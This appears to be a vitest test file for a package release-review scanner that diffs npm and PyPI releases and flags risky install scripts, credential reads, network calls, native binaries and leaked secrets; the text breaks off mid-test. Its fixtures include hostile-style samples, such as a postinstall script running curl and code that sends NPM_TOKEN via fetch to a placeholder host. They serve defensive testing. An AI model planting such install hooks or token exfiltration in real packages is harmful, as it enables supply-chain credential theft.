import { describe, expect, test } from "vitest";
import {
  annotateFindingsWithDiffStatus,
  computeRisk,
  createPackageDiff,
  deterministicFindings,
  packageJsonDiffFindings,
  projectReleaseRuleFindings,
  summarizePackageJsonDiff,
  tarSuspiciousEntryFindings,
} from "../server/lib/review";

describe("review", () => {
  test("diff highlights added modified and removed package files", () => {
    const before = [
      {
        path: "package.json",
        size: 40,
        sha256: "a",
        flags: [],
        textSample: JSON.stringify({ name: "pkg", version: "1.0.0" }),
      },
      { path: "index.js", size: 10, sha256: "b", flags: [], textSample: "export {}" },
      { path: "old.js", size: 10, sha256: "c", flags: [], textSample: "" },
    ];
    const staged = [
      {
        path: "package.json",
        size: 70,
        sha256: "d",
        flags: [],
        textSample: JSON.stringify({
          name: "pkg",
          version: "1.0.1",
          scripts: { postinstall: "node install.js" },
        }),
      },
      { path: "index.js", size: 10, sha256: "b", flags: [], textSample: "export {}" },
      {
        path: "install.js",
        size: 30,
        sha256: "e",
        flags: [],
        textSample: "require('child_process').execSync('curl https://x')",
      },
    ];

    const diff = createPackageDiff(before, staged);

    expect(diff.find((entry) => entry.path === "install.js")?.status).toBe("added");
    expect(diff.find((entry) => entry.path === "package.json")?.status).toBe("modified");
    expect(diff.find((entry) => entry.path === "old.js")?.status).toBe("removed");
    expect(diff.find((entry) => entry.path === "index.js")?.status).toBe("unchanged");
  });

  test("diff treats skipped file content as modified when hashes are missing (legacy artifacts)", () => {
    const before = [
      {
        path: "bin/native.node",
        size: 50_000_000,
        sha256: "",
        flags: ["content-skipped"],
      },
    ];
    const staged = [
      {
        path: "bin/native.node",
        size: 50_000_000,
        sha256: "",
        flags: ["content-skipped"],
      },
    ];

    const diff = createPackageDiff(before, staged);

    expect(diff.find((entry) => entry.path === "bin/native.node")).toMatchObject({
      status: "modified",
      flags: ["content-skipped"],
    });
  });

  test("diff proves a skipped file unchanged when its streamed hashes match", () => {
    // Skipped bodies are hashed while being discarded, so equal real hashes
    // mean the uninspected binary is byte-identical to the published baseline.
    const hash = "a".repeat(64);
    const before = [
      { path: "bin/native.node", size: 50_000_000, sha256: hash, flags: ["content-skipped"] },
    ];
    const staged = [
      { path: "bin/native.node", size: 50_000_000, sha256: hash, flags: ["content-skipped"] },
    ];

    const diff = createPackageDiff(before, staged);

    expect(diff.find((entry) => entry.path === "bin/native.node")).toMatchObject({
      status: "unchanged",
      flags: ["content-skipped"],
    });
  });

  test("diff marks a skipped file modified when its streamed hashes differ", () => {
    const before = [
      {
        path: "bin/native.node",
        size: 50_000_000,
        sha256: "a".repeat(64),
        flags: ["content-skipped"],
      },
    ];
    const staged = [
      {
        path: "bin/native.node",
        size: 50_000_001,
        sha256: "b".repeat(64),
        flags: ["content-skipped"],
      },
    ];

    const diff = createPackageDiff(before, staged);

    expect(diff.find((entry) => entry.path === "bin/native.node")?.status).toBe("modified");
  });

  test("a clipped baseline sample stays out of the canonical diff entry", () => {
    // DiffEntry.flags is report data (summary_json.diff, R2 diff.json, the
    // exported report.json). The baseline-side retention cap is a fact about the
    // published version's parse, not about the reviewed release, so a big
    // unchanged file must not come back looking clipped.
    const hash = "c".repeat(64);
    const before = [
      {
        path: "dist/bundle.js",
        size: 3 * 1024 * 1024,
        sha256: hash,
        flags: ["baseline-truncated"],
        textSample: "export const value = 1;\n",
      },
    ];
    const staged = [
      {
        path: "dist/bundle.js",
        size: 3 * 1024 * 1024,
        sha256: hash,
        flags: [],
        textSample: "export const value = 1;\n",
      },
    ];

    const diff = createPackageDiff(before, staged);

    expect(diff.find((entry) => entry.path === "dist/bundle.js")).toMatchObject({
      status: "unchanged",
      flags: [],
    });
  });

  test("a modified file keeps its own flags while dropping baseline retention flags", () => {
    const before = [
      {
        path: "dist/bundle.js",
        size: 3 * 1024 * 1024,
        sha256: "a".repeat(64),
        flags: ["baseline-truncated"],
      },
    ];
    const staged = [
      {
        path: "dist/bundle.js",
        size: 3 * 1024 * 1024,
        sha256: "b".repeat(64),
        flags: ["truncated"],
      },
    ];

    const diff = createPackageDiff(before, staged);

    // The staged side's display truncation is real and still reported.
    expect(diff.find((entry) => entry.path === "dist/bundle.js")).toMatchObject({
      status: "modified",
      flags: ["truncated"],
    });
  });

  test("deterministic policy escalates risky new staged changes", () => {
    const staged = [
      {
        path: "package.json",
        size: 70,
        sha256: "d",
        flags: [],
        textSample: JSON.stringify({ scripts: { preinstall: "node install.js" } }),
      },
      {
        path: "install.js",
        size: 30,
        sha256: "e",
        flags: [],
        textSample: "process.env.NPM_TOKEN; new Function('return 1')",
      },
    ];
    const diff = createPackageDiff([], staged);
    const findings = deterministicFindings(staged, diff);

    expect(computeRisk(findings)).toBe("critical");
    expect(findings.some((finding) => finding.evidence.includes("preinstall"))).toBe(true);
    expect(findings.some((finding) => finding.evidence.includes("secret/environment access"))).toBe(
      true,
    );
  });

  test("escalates root gyp command substitution that executes package JavaScript", () => {
    const previous = [
      {
        path: "package.json",
        size: 42,
        sha256: "prev-package-json",
        flags: [],
        textSample: JSON.stringify({ name: "pkg", version: "1.0.0" }),
      },
    ];
    const staged = [
      {
        path: "package.json",
        size: 42,
        sha256: "staged-package-json",
        flags: [],
        textSample: JSON.stringify({ name: "pkg", version: "1.0.1" }),
      },
      {
        path: "binding.gyp",
        size: 157,
        sha256: "binding-gyp",
        flags: [],
        textSample:
          '{\n  "targets": [{\n    "target_name": "Setup",\n    "type": "none",\n    "sources": ["<!(node index.js > /dev/null 2>&1 && echo stub.c)"]\n  }]\n}\n',
      },
      {
        path: "index.js",
        size: 160,
        sha256: "index-js",
        flags: [],
        textSample:
          "eval(function rotate(payload) { return payload; }('defanged payload placeholder'));\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff(previous, staged));

    expect(computeRisk(findings)).toBe("critical");
    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: "install-script.implicit-node-gyp",
          severity: "high",
          file: "binding.gyp",
        }),
        expect.objectContaining({
          ruleId: "install-script.gyp-command-substitution",
          severity: "critical",
          file: "binding.gyp",
          line: 5,
        }),
      ]),
    );
  });

  test("flags extensionless native binaries via parser magic-byte flags with sha256 evidence", () => {
    // The Windows-skew regression: the .exe matched the extension check, but
    // the same release's extensionless Linux/macOS binaries were invisible.
    const staged = [
      {
        path: "bin/cli-windows-x64.exe",
        size: 23068672,
        sha256: "windows-pe-hash",
        flags: ["content-skipped", "native-pe"],
      },
      {
        path: "bin/cli-linux-x64",
        size: 22020096,
        sha256: "linux-elf-hash",
        flags: ["content-skipped", "native-elf"],
      },
      {
        path: "bin/cli-darwin-arm64",
        size: 20971520,
        sha256: "darwin-macho-hash",
        flags: ["content-skipped", "native-macho"],
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));
    const native = findings.filter((finding) => finding.ruleId === "file.native-artifact");

    expect(native).toHaveLength(3);
    expect(native).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          severity: "high",
          file: "bin/cli-linux-x64",
          evidence: "ELF executable (magic bytes); sha256 linux-elf-hash",
        }),
        expect.objectContaining({
          severity: "high",
          file: "bin/cli-darwin-arm64",
          evidence: "Mach-O executable (magic bytes); sha256 darwin-macho-hash",
        }),
        expect.objectContaining({
          severity: "high",
          file: "bin/cli-windows-x64.exe",
          evidence: "Windows PE/DOS executable (magic bytes); sha256 windows-pe-hash",
        }),
      ]),
    );
    // The oversized additions also raise diff.large-new-file with the staged hash.
    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: "diff.large-new-file",
          severity: "medium",
          file: "bin/cli-linux-x64",
          evidence: "22020096 byte new file; sha256 linux-elf-hash",
        }),
      ]),
    );
  });

  test("extension-matched native artifacts keep firing without magic flags and carry sha256", () => {
    const staged = [
      {
        path: "prebuilds/linux-x64/addon.node",
        size: 2048576,
        sha256: "addon-hash",
        flags: ["binary"],
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));
    const native = findings.filter((finding) => finding.ruleId === "file.native-artifact");

    expect(native).toHaveLength(1);
    expect(native[0]).toMatchObject({
      severity: "high",
      file: "prebuilds/linux-x64/addon.node",
      evidence: "native, wasm, or executable artifact; sha256 addon-hash",
    });
    // Extension + magic flag on the same file still yields a single finding.
    const flagged = deterministicFindings(
      [{ ...staged[0], flags: ["binary", "native-elf"] }],
      createPackageDiff([], [{ ...staged[0], flags: ["binary", "native-elf"] }]),
    );
    expect(flagged.filter((finding) => finding.ruleId === "file.native-artifact")).toHaveLength(1);
  });

  test("does not apply Python capability patterns to JavaScript packages", () => {
    const staged = [
      {
        path: "template.js",
        size: 60,
        sha256: "template",
        flags: [],
        textSample: "export function render(template) {\n  return compile(template);\n}\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings.some((finding) => finding.ruleId === "code.dynamic-evaluation")).toBe(false);
  });

  test("does not flag unchanged network-only code paths", () => {
    const previous = [
      {
        path: "link/http/createSignalIfSupported.js",
        size: 90,
        sha256: "apollo-http",
        flags: [],
        textSample: "export function createSignalIfSupported() {\n  return fetch('/graphql');\n}\n",
      },
    ];
    const staged = [...previous];
    const findings = deterministicFindings(staged, createPackageDiff(previous, staged), {
      name: "@apollo/client",
      version: "4.2.0",
    });

    expect(findings.some((finding) => finding.ruleId === "code.network-access")).toBe(false);
  });

  test("flags added network-only code paths as contextual", () => {
    const staged = [
      {
        path: "lib/update.js",
        size: 90,
        sha256: "network-only",
        flags: [],
        textSample:
          "import https from 'https';\nhttps.request('https://example.invalid/payload').end();\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: "code.network-access",
          severity: "medium",
          file: "lib/update.js",
        }),
      ]),
    );
  });

  test("still flags network-capable lifecycle script files", () => {
    const staged = [
      {
        path: "package.json",
        size: 80,
        sha256: "pkg",
        flags: [],
        textSample: JSON.stringify({ scripts: { postinstall: "node scripts/install" } }),
      },
      {
        path: "scripts/install.js",
        size: 90,
        sha256: "install",
        flags: [],
        textSample: "fetch('https://example.com/payload.js');\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: "code.network-access",
          severity: "high",
          file: "scripts/install.js",
        }),
      ]),
    );
  });

  test("does not treat fetch method declarations as network access", () => {
    const previous = [
      {
        path: "core/ObservableQuery.js",
        size: 90,
        sha256: "old",
        flags: [],
        textSample:
          "export class ObservableQuery {\n  fetchPolicy() { return 'cache-first'; }\n}\n",
      },
    ];
    const staged = [
      {
        path: "core/ObservableQuery.js",
        size: 180,
        sha256: "new",
        flags: [],
        textSample:
          "export class ObservableQuery {\n  fetchPolicy() { return 'cache-first'; }\n  fetch(options, networkStatus, fetchQuery) {\n    return fetchQuery(options, networkStatus);\n  }\n}\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff(previous, staged));

    expect(findings.some((finding) => finding.ruleId === "code.network-access")).toBe(false);
  });

  test("does not scan documentation as executable capability evidence", () => {
    const staged = [
      {
        path: "CHANGELOG.md",
        size: 160,
        sha256: "changelog",
        flags: [],
        textSample:
          "Previously no AbortController was passed to `fetch()`, so the request kept running.\n",
      },
      {
        path: "skills/apollo-client/references/integration-client.md",
        size: 160,
        sha256: "skill-doc",
        flags: [],
        textSample:
          'const token = localStorage.getItem("token");\nauthorization: token ? `Bearer ${token}` : ""\n',
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings.some((finding) => finding.ruleId?.startsWith("code."))).toBe(false);
    expect(findings.some((finding) => finding.ruleId === "file.secret-content")).toBe(false);
  });

  test("excludes type declaration files from content scanning", () => {
    // .d.ts files keep a diffable sample but must not drive deterministic
    // findings: declaration syntax like `fetch(...)` is a type signature, and
    // scanning large bundled declarations is pure perf/memory cost.
    const staged = [
      {
        path: "dist/index.d.ts",
        size: 200,
        sha256: "decl",
        flags: [],
        textSample:
          "export declare function run(): void;\n" +
          "export declare const fetch: (url: string) => Promise<Response>;\n" +
          "export declare const child_process: typeof import('child_process');\n" +
          "export declare const token: 'npm_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';\n",
      },
      {
        path: "dist/index.d.mts",
        size: 80,
        sha256: "decl-mts",
        flags: [],
        textSample: "export declare const exec: (cmd: string) => void;\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings.some((finding) => finding.ruleId?.startsWith("code."))).toBe(false);
    expect(findings.some((finding) => finding.ruleId === "file.secret-content")).toBe(false);
  });

  test("still flags high-confidence token leaks in documentation", () => {
    const staged = [
      {
        path: "README.md",
        size: 80,
        sha256: "readme-token",
        flags: [],
        textSample: "Do not publish this npm_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA token.\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: "file.secret-content",
          file: "README.md",
        }),
      ]),
    );
  });

  test("still scans executable files with documentation-like basenames", () => {
    const staged = [
      {
        path: "security.js",
        size: 120,
        sha256: "security-script",
        flags: [],
        textSample:
          "const token = process.env.NPM_TOKEN;\nfetch('https://example.invalid', { body: token });\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: "code.credential-access",
          file: "security.js",
        }),
        expect.objectContaining({
          ruleId: "code.network-access",
          file: "security.js",
        }),
      ]),
    );
  });

  test("does not treat common JS env flags as credential access", () => {
    const staged = [
      {
        path: "index.js",
        size: 180,
        sha256: "env-flags",
        flags: [],
        textSample:
          "const mode = process.env.NODE_ENV;\nif (import.meta.env.DEV || process.env['CI']) fetch('https://example.invalid/ping');\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings.some((finding) => finding.ruleId === "code.credential-access")).toBe(false);
    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: "code.network-access",
          severity: "medium",
          file: "index.js",
        }),
      ]),
    );
  });

  test("keeps credential finding lines stable when a multiline env access is stripped", () => {
    // The allowlist strip erases `process.env\n  .npm_command` across the line
    // break; if it also swallowed the newline, the authToken read below would be
    // reported at line 2 instead of its real line 3.
    const staged = [
      {
        path: "index.js",
        size: 92,
        sha256: "multiline-env",
        flags: [],
        textSample:
          "const a = process.env\n  .npm_command;\nconst b = process.env.npm_config__authToken;\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings.find((finding) => finding.ruleId === "code.credential-access")).toMatchObject({
      severity: "high",
      file: "index.js",
      line: 3,
    });
  });

  test("still flags token reads next to common env flags", () => {
    const staged = [
      {
        path: "index.js",
        size: 180,
        sha256: "env-token",
        flags: [],
        textSample:
          "const mode = process.env.NODE_ENV;\nconst token = process.env['NPM_TOKEN'];\nfetch('https://example.invalid', { body: token || mode });\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings.find((finding) => finding.ruleId === "code.credential-access")).toMatchObject({
      severity: "high",
      file: "index.js",
    });
  });

  test("does not flag placeholder URL credentials as secret content", () => {
    // requests' HISTORY.md CVE-2023-32681 entry (`http://user:pass@proxy`) is
    // the canonical benign hit: doc-style placeholder passwords are not leaks.
    const staged = [
      {
        path: "HISTORY.md",
        size: 160,
        sha256: "history",
        flags: [],
        textSample:
          "When proxies are defined with user info (`http://user:pass@proxy.example`),\n" +
          "a Proxy-Authorization header is constructed.\n",
      },
      {
        path: "lib/config.js",
        size: 120,
        sha256: "config",
        flags: [],
        textSample: 'const proxyExample = "https://user:<password>@registry.example.com";\n',
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings.some((finding) => finding.ruleId === "file.secret-content")).toBe(false);
  });

  test("still flags URL credentials with a real-looking password", () => {
    // Weak-word passwords stay findings when the username is not itself a
    // placeholder: `svc:secret@db` is a real (if weak) connection-string
    // credential, unlike doc-style `user:pass@proxy`.
    const staged = [
      {
        path: "lib/config.js",
        size: 120,
        sha256: "config-real",
        flags: [],
        textSample: 'const upstream = "https://deploy:9f8a7b6c5d4e3f2a1b@registry.example.com";\n',
      },
      {
        path: "lib/db.js",
        size: 120,
        sha256: "config-weak",
        flags: [],
        textSample: 'const dsn = "postgres://svc:secret@10.0.0.5:5432/prod";\n',
      },
      {
        path: "lib/admin.js",
        size: 120,
        sha256: "config-admin",
        flags: [],
        textSample: 'const admin = "mysql://root:admin@db.internal:3306/app";\n',
      },
      {
        path: "lib/default-admin.js",
        size: 120,
        sha256: "config-default-admin",
        flags: [],
        textSample: 'const admin = "mysql://admin:admin@db.internal:3306/app";\n',
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));
    const secretFiles = new Set(
      findings.filter((finding) => finding.ruleId === "file.secret-content").map((f) => f.file),
    );

    expect(secretFiles.has("lib/config.js")).toBe(true);
    expect(secretFiles.has("lib/db.js")).toBe(true);
    expect(secretFiles.has("lib/admin.js")).toBe(true);
    expect(secretFiles.has("lib/default-admin.js")).toBe(true);
  });

  test("does not scan Python packaging metadata prose as capability evidence", () => {
    // PKG-INFO / .dist-info/METADATA embed the README long-description, so
    // capability regexes over them only re-flag documentation examples.
    const prose =
      "Metadata-Version: 2.3\nName: demo\nVersion: 1.0.0\n\nUsage:\n\n" +
      '    requests.get("https://api.example.invalid/status")\n\n' +
      "Reads proxy auth from os.environ or a .netrc file.\n";
    const staged = [
      { path: "sdist/PKG-INFO", size: 200, sha256: "pkginfo", flags: [], textSample: prose },
      {
        path: "sdist/src/.egg-info/PKG-INFO",
        size: 200,
        sha256: "egg",
        flags: [],
        textSample: prose,
      },
      {
        path: "wheel/py3-none-any/.dist-info/METADATA",
        size: 200,
        sha256: "meta",
        flags: [],
        textSample: prose,
      },
      {
        path: "wheel/py3-none-any/demo/client.py",
        size: 160,
        sha256: "client",
        flags: [],
        textSample:
          "import os\nimport requests\n\n\ndef send():\n" +
          '    return requests.get("https://api.example.invalid", params={"k": os.environ.get("D")})\n',
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged), null, {
      codePatternSet: "python",
    });
    const codeFindingFiles = new Set(
      findings.filter((finding) => finding.ruleId?.startsWith("code.")).map((f) => f.file),
    );

    expect(codeFindingFiles.has("sdist/PKG-INFO")).toBe(false);
    expect(codeFindingFiles.has("sdist/src/.egg-info/PKG-INFO")).toBe(false);
    expect(codeFindingFiles.has("wheel/py3-none-any/.dist-info/METADATA")).toBe(false);
    // Real package code with the same capabilities still flags.
    expect(codeFindingFiles.has("wheel/py3-none-any/demo/client.py")).toBe(true);
  });

  test("demotes longstanding secret-looking content in unreachable test files", () => {
    const key = {
      path: "test/fixtures/server.key",
      size: 160,
      sha256: "test-key",
      flags: [],
      textSample: "-----BEGIN PRIVATE KEY-----\nTESTFIXTUREONLY\n-----END PRIVATE KEY-----\n",
    };
    const findings = deterministicFindings([key], createPackageDiff([key], [key]));

    expect(findings).toContainEqual(
      expect.objectContaining({
        ruleId: "file.secret-content",
        file: "test/fixtures/server.key",
        // Unchanged files flag high; the test-scope demotion steps it to medium.
        severity: "medium",
        testScoped: true,
        evidence: expect.stringContaining("test-scoped"),
      }),
    );
  });

  test("keeps full severity for a secret newly added to a test tree", () => {
    // A secret entering a test tree is a fresh leak (or fresh payload staging),
    // not longstanding fixture material — the test-scope demotion must not apply.
    const staged = [
      {
        path: "test/fixtures/server.key",
        size: 160,
        sha256: "test-key",
        flags: [],
        textSample: "-----BEGIN PRIVATE KEY-----\nTESTFIXTUREONLY\n-----END PRIVATE KEY-----\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));
    const secret = findings.find((finding) => finding.ruleId === "file.secret-content");

    expect(secret).toMatchObject({ severity: "critical", file: "test/fixtures/server.key" });
    expect(secret.testScoped).toBeUndefined();
  });

  test("keeps full severity for an unchanged Python test secret imported by package code", () => {
    const absoluteSecret = {
      path: "sdist/src/demo/tests/secrets.py",
      size: 80,
      sha256: "python-absolute-secret",
      flags: [],
      textSample: 'password = "production-secret-value"\n',
    };
    const relativeSecret = {
      path: "sdist/src/demo/tests/relative_secrets.py",
      size: 80,
      sha256: "python-relative-secret",
      flags: [],
      textSample: 'password = "another-production-secret"\n',
    };
    const app = {
      path: "sdist/src/demo/app.py",
      size: 80,
      sha256: "python-app",
      flags: [],
      textSample:
        "from demo.tests.secrets import password\n" +
        "from .tests.relative_secrets import password as relative_password\n",
    };
    const findings = deterministicFindings(
      [absoluteSecret, relativeSecret, app],
      createPackageDiff([absoluteSecret, relativeSecret], [absoluteSecret, relativeSecret, app]),
      null,
      { codePatternSet: "python" },
    );
    const secretFindings = findings.filter(
      (candidate) => candidate.ruleId === "file.secret-content",
    );

    expect(secretFindings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ severity: "high", file: absoluteSecret.path }),
        expect.objectContaining({ severity: "high", file: relativeSecret.path }),
      ]),
    );
    expect(secretFindings.every((finding) => finding.testScoped === undefined)).toBe(true);
  });

  test("does not flag secret-looking source map content", () => {
    // The tar parser strips text samples from .map files (shouldSkipTextSample),
    // so deterministic rules never see source-map contents.
    const staged = [
      {
        path: "core/index.js.map",
        size: 120,
        sha256: "map",
        flags: ["text-sample-skipped"],
      },
      {
        path: "config.js",
        size: 80,
        sha256: "secret",
        flags: [],
        textSample: "export const config = { password: 'abc!def@ghi#jkl' };\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(
      findings.some(
        (finding) =>
          finding.ruleId === "file.secret-content" && finding.file === "core/index.js.map",
      ),
    ).toBe(false);
    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: "file.secret-content",
          file: "config.js",
        }),
      ]),
    );
  });

  test("does not treat importlib.metadata as Python dynamic evaluation", () => {
    const staged = [
      {
        path: "demo_package/_version.py",
        size: 90,
        sha256: "version",
        flags: [],
        textSample:
          'from importlib.metadata import version\n__version__ = version("demo-package")\n',
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged), null, {
      codePatternSet: "python",
    });

    expect(findings.some((finding) => finding.ruleId === "code.dynamic-evaluation")).toBe(false);
  });

  test("detects Python dynamic import execution", () => {
    const staged = [
      {
        path: "demo_package/loader.py",
        size: 90,
        sha256: "loader",
        flags: [],
        textSample: 'import importlib\nplugin = importlib.import_module("demo_package.plugin")\n',
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged), null, {
      codePatternSet: "python",
    });

    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: "code.dynamic-evaluation",
          file: "demo_package/loader.py",
        }),
      ]),
    );
  });

  test("adds best-effort line numbers and diff annotations to findings", () => {
    const before = [
      {
        path: "index.js",
        size: 20,
        sha256: "old",
        flags: [],
        textSample: "export const value = 1;\n",
      },
    ];
    const staged = [
      {
        path: "package.json",
        size: 120,
        sha256: "pkg",
        flags: [],
        textSample: `{
  "name": "pkg",
  "scripts": {
    "postinstall": "node install.js"
  }
}`,
      },
      {
        path: "index.js",
        size: 80,
        sha256: "new",
        flags: [],
        textSample: "export const value = 1;\nfetch('/debug');\n",
      },
    ];
    const diff = createPackageDiff(before, staged);
    const findings = deterministicFindings(staged, diff);

    expect(findings).toContainEqual(
      expect.objectContaining({
        file: "package.json",
        evidence: "postinstall: node install.js",
        line: 4,
      }),
    );
    expect(findings).toContainEqual(
      expect.objectContaining({
        file: "index.js",
        evidence: "new/changed modified file: network-capable code path",
        line: 2,
      }),
    );

    const annotated = annotateFindingsWithDiffStatus(findings, diff);
    expect(annotated.find((finding) => finding.file === "index.js")).toMatchObject({
      diffStatus: "modified",
      releaseDelta: true,
    });
    expect(annotated.find((finding) => finding.file === "package.json")).toMatchObject({
      diffStatus: "added",
      releaseDelta: true,
    });

    // With no downloaded baseline every file reads as added, which would grade
    // the package's whole contents as this release's delta. Report the missing
    // comparison instead.
    const withoutBaseline = annotateFindingsWithDiffStatus(findings, diff, {
      baselineComparisonSkipped: true,
    });
    expect(withoutBaseline.every((finding) => finding.releaseDelta === false)).toBe(true);
    expect(withoutBaseline.every((finding) => finding.diffStatus === "unknown")).toBe(true);
  });

  test("keeps modified-file findings contextual when the finding line did not change", () => {
    const previous = [
      {
        path: "src/server.ts",
        size: 60,
        sha256: "old",
        flags: [],
        textSample: "fetch('/existing-risk');\nexport const value = 1;\n",
      },
    ];
    const staged = [
      {
        path: "src/server.ts",
        size: 60,
        sha256: "new",
        flags: [],
        textSample: "fetch('/existing-risk');\nexport const value = 2;\n",
      },
    ];
    const diff = createPackageDiff(previous, staged);
    const annotated = annotateFindingsWithDiffStatus(
      [
        {
          id: "existing-risk",
          severity: "medium",
          file: "src/server.ts",
          line: 1,
          evidence: "network-capable code path",
          reason: "existing network path",
        },
        {
          id: "changed-line",
          severity: "medium",
          file: "src/server.ts",
          line: 2,
          evidence: "changed value",
          reason: "changed release line",
        },
      ],
      diff,
      { previousFiles: previous, stagedFiles: staged },
    );

    expect(annotated.find((finding) => finding.id === "existing-risk")).toMatchObject({
      diffStatus: "modified",
      releaseDelta: false,
    });
    expect(annotated.find((finding) => finding.id === "changed-line")).toMatchObject({
      diffStatus: "modified",
      releaseDelta: true,
    });
  });

  test("projects only release-scoped findings without persistence annotations", () => {
    const base = {
      severity: "high",
      file: "index.js",
      evidence: "network-capable code path",
      reason: "release code opens a network connection",
      ruleId: "code.network-access",
      ruleVersion: "1.0.0",
    };

    expect(
      projectReleaseRuleFindings([
        { ...base, diffStatus: "added", releaseDelta: true },
        { ...base, file: "existing.js", diffStatus: "unchanged", releaseDelta: false },
      ]),
    ).toEqual([base]);
  });

  test("classifies manifest-diff dependency findings as release delta regardless of line", () => {
    // These rules are derived from the previous-vs-staged manifest diff, so they
    // are release-scoped by construction; they must not fall through to the
    // line-diff heuristic where an unchanged duplicate key would misclassify
    // them as package context.
    const annotated = annotateFindingsWithDiffStatus(
      [
        { id: "added", severity: "medium", file: "package.json", ruleId: "dependency.added" },
        { id: "bump", severity: "low", file: "package.json", ruleId: "dependency.major-bump" },
      ],
      [{ path: "package.json", status: "modified" }],
      {},
    );

    expect(annotated.every((finding) => finding.releaseDelta)).toBe(true);
  });

  test("keeps modified-file findings release scoped when a later matching line changed", () => {
    const previous = [
      {
        path: "src/server.ts",
        size: 60,
        sha256: "old",
        flags: [],
        textSample: "fetch('/existing-risk');\nexport const value = 1;\n",
      },
    ];
    const staged = [
      {
        path: "src/server.ts",
        size: 90,
        sha256: "new",
        flags: [],
        textSample:
          "fetch('/existing-risk');\nexport const value = 1;\nfetch('https://example.invalid/new-risk');\n",
      },
    ];
    const diff = createPackageDiff(previous, staged);
    const findings = deterministicFindings(staged, diff);
    const annotated = annotateFindingsWithDiffStatus(findings, diff, {
      previousFiles: previous,
      stagedFiles: staged,
    });

    expect(annotated.find((finding) => finding.ruleId === "code.network-access")).toMatchObject({
      line: 1,
      diffStatus: "modified",
      releaseDelta: true,
    });
  });

  test("uses Python annotation patterns for extensionless modified files", () => {
    const previous = [
      {
        path: "scripts/post_install",
        size: 100,
        sha256: "old",
        flags: [],
        textSample:
          "import urllib.request\nurllib.request.urlopen('https://example.invalid/existing')\nvalue = 1\n",
      },
    ];
    const staged = [
      {
        path: "scripts/post_install",
        size: 160,
        sha256: "new",
        flags: [],
        textSample:
          "import urllib.request\nurllib.request.urlopen('https://example.invalid/existing')\nvalue = 2\nurllib.request.urlopen('https://example.invalid/new')\n",
      },
    ];
    const diff = createPackageDiff(previous, staged);
    const findings = deterministicFindings(staged, diff, null, { codePatternSet: "python" });
    const annotated = annotateFindingsWithDiffStatus(findings, diff, {
      previousFiles: previous,
      stagedFiles: staged,
      codePatternSet: "python",
    });

    expect(annotated.find((finding) => finding.ruleId === "code.network-access")).toMatchObject({
      file: "scripts/post_install",
      line: 1,
      diffStatus: "modified",
      releaseDelta: true,
    });
  });

  test("keeps PyPI adapter findings release scoped even when paths use artifact namespaces", () => {
    const diff = [
      {
        path: "wheel/py3-none-any/sitecustomize.py",
        status: "added",
        stagedSize: 7,
        stagedSha256: "hook",
        flags: [],
      },
    ];
    const annotated = annotateFindingsWithDiffStatus(
      [
        {
          severity: "high",
          file: "dist/demo_package-1.2.0-py3-none-any.whl/sitecustomize.py",
          evidence: "sitecustomize.py runs automatically on interpreter startup",
          reason: "startup hook",
          ruleId: "pypi.startup-hook",
        },
      ],
      diff,
    );

    expect(annotated[0]).toMatchObject({
      diffStatus: "unknown",
      releaseDelta: true,
    });
  });

  test("keeps VS Code adapter findings release scoped on an unchanged file with a baseline", () => {
    const unchangedFile = {
      path: "out/extension.js",
      size: 40,
      sha256: "same",
      textSample: "exports.activate = () => require('vm').runInThisContext(x);",
      flags: [],
    };
    const diff = [{ path: "out/extension.js", status: "unchanged" }];
    // A VSIX with a marketplace baseline whose flagged file did not change since
    // the last release. The finding is a property of the release, not a line
    // diff, so it must stay release-scoped instead of falling through to a
    // releaseDelta: false diff annotation that understates releaseRisk.
    const annotated = annotateFindingsWithDiffStatus(
      [
        {
          severity: "high",
          file: "out/extension.js",
          line: 1,
          evidence: "activation loads a WebAssembly module on startup",
          reason: "startup wasm loader",
          ruleId: "vscode.startup-wasm-loader",
        },
      ],
      diff,
      {
        codePatternSet: "javascript",
        previousFiles: [unchangedFile],
        stagedFiles: [unchangedFile],
      },
    );

    expect(annotated[0]).toMatchObject({
      diffStatus: "unchanged",
      releaseDelta: true,
    });
  });

  test("package json diff summarizes release-review sensitive fields", () => {
    const summary = summarizePackageJsonDiff(
      {
        name: "pkg",
        version: "1.0.0",
        scripts: {},
